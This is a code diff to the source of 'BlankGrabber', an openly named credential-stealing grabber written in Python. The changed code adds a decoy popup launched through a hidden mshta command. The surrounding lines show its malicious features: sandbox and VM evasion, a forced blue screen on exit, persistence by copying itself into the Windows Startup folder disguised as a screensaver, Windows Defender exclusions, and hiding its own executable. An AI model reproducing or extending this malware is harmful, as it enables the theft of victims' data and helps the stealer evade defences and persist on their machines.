@@ -34,6 +34,7 @@ VMPROTECT = _config.get("VMPROTECT", True) # Protect your grabber from VMs
 BSOD = _config.get("BSOD", True) # Tries to trigger Blue Screen if grabber force exit
 STARTUP = _config.get("STARTUP", True) # Puts the grabber in startup
 HIDE_ITSELF = _config.get("HIDE_ITSELF", True) # Hides the Grabber
+MESSAGE_BOX = _config.get("MSGBOX", dict()) # Message Box
 
 def catch(func):
     def newfunc(*args, **kwargs):
@@ -43,6 +44,21 @@ def catch(func):
             trb = traceback.extract_tb(sys.exc_info()[2])[-1]
             _errorlogs.append(f"Line {trb[1]} : {trb[2]} : {e.__class__.__name__} : {e}")
     return newfunc
+
+def messagebox(config):
+    title = config.get("title")
+    message = config.get("message")
+    icon = config.get("icon")
+    buttons = config.get("buttons")
+
+    if not all(x is not None for x in (title, message, icon, buttons)):
+        return
+        
+    title = title.replace("\x22", "\\x22").replace("\x27", "\\x22")
+    message = message.replace("\x22", "\\x22").replace("\x27", "\\x22")
+        
+    cmd = f'''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{message}', 0, '{title}', {icon}+{buttons});close()"'''
+    subprocess.Popen(cmd, shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 
 def fquit():
     if BSOD:
@@ -69,6 +85,9 @@ def generate(num=5, invisible= False):
         return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
     else:
         return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))
+
+def isInStartup():
+    return os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] == "startup"
 
 
 def force_decode(b: bytes):
@@ -685,7 +704,7 @@ if __name__ == "__main__":
                 except Exception:
                     os._exit(1)
             if STARTUP:
-                if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
+                if not isInStartup():
                     try:
                         exepath = os.path.join("C:/ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp", f"ScreenSaver-{generate()}.scr")
                         wd_exclude(exepath)
@@ -693,8 +712,10 @@ if __name__ == "__main__":
                         BlankGrabber.copy("Blank", sys.executable, exepath)
                     except Exception:
                         pass
+            if bool(MESSAGE_BOX) and not isInStartup():
+                messagebox(MESSAGE_BOX)
 
-            if HIDE_ITSELF and os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != "startup":
+            if HIDE_ITSELF and not isInStartup():
                 subprocess.run(f"attrib \"{sys.executable}\" +s +h", shell= True, capture_output= True)
             try:
                 wd_exclude()
